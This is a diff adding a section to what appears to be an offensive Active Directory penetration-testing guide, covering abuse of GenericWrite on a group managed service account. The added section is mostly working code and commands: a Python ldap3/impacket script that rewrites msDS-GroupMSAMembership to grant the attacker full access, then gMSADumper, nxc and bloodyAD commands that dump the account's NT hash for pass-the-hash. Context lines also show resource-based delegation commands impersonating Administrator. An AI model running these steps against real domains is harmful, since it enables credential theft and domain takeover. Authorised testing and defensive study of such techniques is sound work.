@@ -114,6 +114,75 @@ impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -dc-ip <d
 impacket-getST -spn cifs/<target_computer> -impersonate Administrator -dc-ip <dc_ip> 'domain.local/EVIL$:P@ss123!'
 ```
 
+### `GenericWrite` on gMSA (Group Managed Service Account)
+
+GenericWrite on a gMSA is **equivalent to holding its password** — you can grant yourself read access to `msDS-GroupMSAMembership` and dump the NT hash.
+
+**Mechanism**: `msDS-GroupMSAMembership` is a security descriptor (binary SD) that defines which principals can read the managed password blob (`msDS-ManagedPassword`). Overwriting it grants password read access.
+
+**Approach**: read-modify-write when possible to avoid breaking existing readers. If blind-write is acceptable (lab/CTF), a minimal SD granting your principal full access works.
+
+```python
+# Grant attacker read access to gMSA password (Python + ldap3)
+import ldap3
+from impacket.ldap import ldaptypes
+
+s = ldap3.Server('<dc_ip>')
+c = ldap3.Connection(s, user='domain\\attacker', password='pass',
+                     authentication=ldap3.NTLM, auto_bind=True)
+
+# Build security descriptor granting attacker SID read access
+attacker_sid = 'S-1-5-21-...-<attacker_RID>'  # get from whoami /user or LDAP
+
+sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+sd['Revision'] = b'\x01'
+sd['Sbz1'] = b'\x00'
+sd['Control'] = 32772  # SE_DACL_PRESENT | SE_SELF_RELATIVE
+sd['OwnerSid'] = ldaptypes.LDAP_SID()
+sd['OwnerSid'].fromCanonical('S-1-5-18')  # LocalSystem as owner
+sd['GroupSid'] = b''
+sd['Sacl'] = b''
+
+acl = ldaptypes.ACL()
+acl['AclRevision'] = 4
+acl['Sbz1'] = 0
+acl['Sbz2'] = 0
+
+ace = ldaptypes.ACE()
+ace['AceType'] = 0  # ACCESS_ALLOWED
+ace['AceFlags'] = 0
+nace = ldaptypes.ACCESS_ALLOWED_ACE()
+nace['Mask'] = ldaptypes.ACCESS_MASK()
+nace['Mask']['Mask'] = 983551  # GENERIC_ALL
+nace['Sid'] = ldaptypes.LDAP_SID()
+nace['Sid'].fromCanonical(attacker_sid)
+ace['Ace'] = nace
+
+acl.aces = [ace]
+sd['Dacl'] = acl
+
+c.modify('CN=<gmsa_name>,CN=Managed Service Accounts,DC=domain,DC=local',
+         {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]})
+print(c.result)  # Should show 'success'
+```
+
+Then dump the password:
+
+```bash
+# After granting read access, dump gMSA NT hash
+python3 gMSADumper.py -u attacker -p pass -d domain.local -l <dc_ip>
+nxc ldap <dc_ip> -u attacker -p pass -M gmsa
+
+# Or via bloodyAD
+bloodyAD --host <dc_ip> -d domain.local -u attacker -p pass \
+  get object '<gmsa_name>$' --attr msDS-ManagedPassword
+```
+
+**Verification**: confirm the NT hash works for pass-the-hash authentication (gMSA accounts often have Remote Management Users, delegation rights, or other high-value memberships).
+
+**Cleanup**: restore the original `msDS-GroupMSAMembership` value if read-modify-write was used. In a blind-write scenario, document the change for cleanup phase.
+
+
 ### `WriteSPN` (Validated Write to servicePrincipalName)
 
 Separate from GenericWrite: the "Validated Write to servicePrincipalName" permission is a specific property right that allows modifying SPNs without full GenericWrite. Often granted to helpdesk groups, server operators, or via delegation on OUs containing computer objects.
